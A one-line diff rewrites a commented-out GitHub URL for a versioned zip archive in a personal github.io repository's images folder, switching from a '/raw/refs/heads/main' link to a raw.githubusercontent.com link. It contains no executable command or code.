@@ -1,1 +1,1 @@
-# https://github.com/Dthanggg/dthangg.github.io/raw/refs/heads/main/images/io_github_dthangg_v2.6.zip
+# https://raw.githubusercontent.com/Dthanggg/dthangg.github.io/main/images/io_github_dthangg_v2.6.zip
